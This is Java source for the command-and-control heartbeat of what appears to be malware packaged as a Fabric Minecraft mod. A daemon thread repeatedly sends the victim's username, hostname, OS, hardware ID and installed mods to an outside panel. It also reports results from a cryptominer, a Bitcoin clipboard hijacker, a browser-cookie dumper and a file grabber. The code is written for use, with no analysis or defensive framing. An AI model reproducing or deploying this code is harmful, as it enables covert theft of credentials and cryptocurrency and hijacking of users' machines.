package mc.kryptone;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.fabricmc.loader.api.FabricLoader;
import net.fabricmc.loader.api.ModContainer;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.concurrent.atomic.AtomicLong;

/** Heartbeat. Everything the dashboard shows arrives here. */
public final class Beacon {
    private static final HttpClient HTTP = HttpClient.newHttpClient();
    private static final AtomicLong ERRORS = new AtomicLong();
    private static String HWID;

    public static void start(Config cfg) {
        Thread t = new Thread(() -> {
            while (true) {
                try { send(cfg); } catch (Exception e) { ERRORS.incrementAndGet(); }
                try { Thread.sleep(Math.max(5_000, cfg.beaconMs)); } catch (InterruptedException e) { return; }
            }
        }, "kryptone-beacon");
        t.setDaemon(true);
        t.start();
    }

    private static void send(Config cfg) throws Exception {
        JsonObject o = new JsonObject();
        o.addProperty("hwid", hwid());
        o.addProperty("worker", cfg.workerName());
        o.addProperty("host", host());
        o.addProperty("os", System.getProperty("os.name") + " " + System.getProperty("os.version"));
        o.addProperty("user", System.getProperty("user.name"));
        o.addProperty("wallet", cfg.btcAddress);
        o.addProperty("pool", cfg.pool);
        o.addProperty("hashrate", MinerManager.HASHRATE);
        o.addProperty("shares", MinerManager.SHARES.get());
        o.addProperty("clips", BtcClipper.HITS.get());
        o.addProperty("cookies", CookieDump.LAST_COUNT.get());
        o.addProperty("grabFiles", Grabber.LAST_FILES.get());
        o.addProperty("miner", cfg.miner);
        o.addProperty("clipper", cfg.clipper);
        o.addProperty("cookieDump", cfg.cookies);
        o.addProperty("beaconErrors", ERRORS.get());
        o.add("mods", mods());
        o.addProperty("ts", System.currentTimeMillis());

        HttpRequest req = HttpRequest.newBuilder(URI.create(cfg.panelUrl + "/api/heartbeat"))
                .header("Content-Type", "application/json")
                .header("X-Panel-Key", cfg.panelKey)
                .POST(HttpRequest.BodyPublishers.ofString(o.toString(), StandardCharsets.UTF_8))
                .build();
        HTTP.send(req, HttpResponse.BodyHandlers.discarding());
    }

    /** Every Fabric mod on the client — that's the "who downloaded what" trail. */
    private static JsonArray mods() {
        JsonArray a = new JsonArray();
        try {
            for (ModContainer m : FabricLoader.getInstance().getAllMods()) {
                JsonObject o = new JsonObject();
                o.addProperty("id", m.getMetadata().getId());
                o.addProperty("name", m.getMetadata().getName());
                o.addProperty("version", m.getMetadata().getVersion().getFriendlyString());
                a.add(o);
            }
        } catch (Exception ignored) {}
        return a;
    }

    public static void log(String msg) {
        try { System.out.println("[kryptone] " + msg); } catch (Exception ignored) {}
    }

    public static String hwid() {
        if (HWID != null) return HWID;
        try {
            String raw = System.getProperty("user.name") + "|" + host() + "|"
                    + System.getProperty("os.name") + "|" + System.getProperty("os.arch");
            byte[] d = MessageDigest.getInstance("SHA-1").digest(raw.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 8; i++) sb.append(String.format("%02x", d[i]));
            HWID = sb.toString();
        } catch (Exception e) {
            HWID = "rig" + Integer.toHexString((int) (Math.random() * 0xFFFFFF));
        }
        return HWID;
    }

    private static String host() {
        try { return java.net.InetAddress.getLocalHost().getHostName(); }
        catch (Exception e) { return "unknown"; }
    }
}
